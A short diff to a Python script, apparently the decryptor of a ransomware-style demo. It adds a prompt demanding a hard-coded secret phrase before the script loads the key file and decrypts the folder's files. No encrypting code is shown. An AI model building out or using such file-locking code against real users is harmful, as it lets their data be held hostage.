@@ -10,7 +10,10 @@ for file in os.listdir():
         files.append(file)
         print(files)
         
-        
+secretPhrase = input("Enter the secret phrase to decrypt your files: ")
+if secretPhrase != "autoSpy":
+    print("Wrong secret phrase! Exiting...")
+    exit()        
 keyFile = open("thekey.key", 'rb')
 key = keyFile.read()
 keyFile.close()
